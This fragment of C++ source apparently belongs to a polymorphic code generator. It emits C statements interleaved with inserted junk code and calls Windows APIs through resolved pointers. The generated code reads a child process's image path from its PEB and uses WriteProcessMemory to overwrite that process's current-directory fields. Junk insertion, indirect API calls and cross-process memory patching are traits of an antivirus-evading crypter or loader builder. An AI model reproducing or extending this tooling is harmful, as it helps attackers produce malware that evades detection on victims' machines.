	_lines.add("_childPathName = (WCHAR*)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, _params.ImagePathName.Length + 1);");
	
	CODE_BLOCK_IF_NO_TRASH("if (!_childCurrentDir || !_childPathName)", "return 0;");
	
	_lines.add("_ret = (BOOL)pReadProcessMemory(_process, (LPCVOID)_params.ImagePathName.Buffer, _childPathName, _params.ImagePathName.Length, (LPVOID)0);");
	
	CODE_BLOCK_IF_NO_TRASH("if (_ret == 0)", "pLocalFree(_childPathName); pLocalFree(_childCurrentDir); return 0;");
	
	_lines.set_trash_flags(IS_LOOP | DO_NOT_CHANGE_PARENT);
	{
		auto _loop = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "for (_currentPos = 0; _currentPos < (_params.ImagePathName.Length / sizeof(_childPathName[0])); _currentPos++)");

		_lines.push();
		{
			CODE_BLOCK_IF_NO_TRASH("if (_childPathName[_currentPos] == '\\\\')", "_lastSlash = _currentPos;");
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_loop, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_lines.add("_childPathName[_lastSlash] = (WCHAR)0;");
	_lines.add("_newCurDirSize = _params.ImagePathName.Length - (_params.ImagePathName.Length - ((_lastSlash + 1) * 2));");
	_lines.add("_lengthCurDirOffset = offsetof(RTL_USER_PROCESS_PARAMETERS, CurrentDirectory.DosPath.Length);");
	_lines.add("_lengthCurDirAddr = (LPVOID)((ULONG_PTR)_peb->ProcessParameters + (ULONG_PTR)_lengthCurDirOffset);");

	_lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);
	{
		auto _block_if = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, "if (_params.CurrentDirectory.DosPath.MaximumLength >= _newCurDirSize)");

		_lines.push();
		{
			_lines.add("_ret = (BOOL)pWriteProcessMemory(_process, (LPCVOID)_lengthCurDirAddr, &_newCurDirSize, sizeof(USHORT), (LPVOID)0);");

			CODE_BLOCK_IF_NO_TRASH("if (_ret == 0)", "pLocalFree(_childPathName); pLocalFree(_childCurrentDir); return 0;");

			_lines.add("_ret = (BOOL)pWriteProcessMemory(_process, (LPCVOID)_params.CurrentDirectory.DosPath.Buffer, _childPathName, _newCurDirSize, (LPVOID)0);");
			
			CODE_BLOCK_IF_NO_TRASH("if (_ret == 0)", "pLocalFree(_childPathName); pLocalFree(_childCurrentDir); return 0;");
		}
		_lines.pop();

		for (int i = 0; i < 2; i++)
		{
			_func->get_code_generator()->emulate_block(_block_if, false);
		}

		_lines.set_trash_flags(NULL);
	}

	_END_FUNC();

	_lines.add("return 1;");
}